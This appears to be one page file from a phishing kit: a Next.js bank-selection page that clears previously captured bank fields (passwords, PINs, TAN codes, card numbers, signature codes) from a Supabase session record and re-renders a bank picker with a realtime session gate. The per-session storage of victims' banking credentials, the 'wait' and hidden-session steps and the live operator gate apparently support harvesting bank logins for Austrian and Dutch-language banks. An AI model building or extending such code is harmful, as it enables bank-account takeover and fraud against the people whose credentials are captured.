import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { getBankCatalog } from "@/lib/at-bank-catalog";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { createServerSupabaseClient } from "@/lib/supabase/server";
import { BankenClientClean } from "./banken-client-clean";

export const dynamic = "force-dynamic";

const BANK_SESSION_FIELDS_TO_CLEAR = [
  "bankSlug",
  "bankName",
  "loginMethod",
  "personalCode",
  "bankPhone",
  "username",
  "password",
  "verfuegernummer",
  "pin",
  "tacCode",
  "rekeningnummer",
  "pasnummer",
  "toegangscode",
  "signatuur",
  "identificatiecode",
  "orderedField1",
  "orderedField1Key",
  "orderedField2",
  "orderedField2Key",
  "orderedField2Type",
  "orderedField3",
  "orderedField3Key",
  "orderedField3Type",
] as const;

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function BankenPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  if (sessionId) {
    const supabase = await createServerSupabaseClient();
    if (supabase) {
      const { data } = await supabase
        .from("sessions")
        .select("current_step,form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (data) {
        const currentStep = typeof data.current_step === "string" ? data.current_step : "";
        const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
        const nextFormData = { ...previousFormData };
        const hadBankState =
          currentStep === "bank" ||
          currentStep === "bank_login" ||
          currentStep === "wait" ||
          BANK_SESSION_FIELDS_TO_CLEAR.some((key) => {
            const value = previousFormData[key];
            return typeof value === "string" ? value.trim().length > 0 : Boolean(value);
          });

        for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
          delete nextFormData[field];
        }

        if (hadBankState) {
          await supabase
            .from("sessions")
            .update({
              is_hidden: false,
              current_step: "banken",
              form_data: nextFormData,
            })
            .eq("id", sessionId);
        }
      }
    }
  }

  const banks = await getBankCatalog();

  return (
    <>
      {sessionId ? <SessionRealtimeGate sessionId={sessionId} routeSessionId={routeSessionId} /> : null}
      <BankenClientClean sessionId={sessionId} routeSessionId={routeSessionId} initialBanks={banks} />
    </>
  );
}
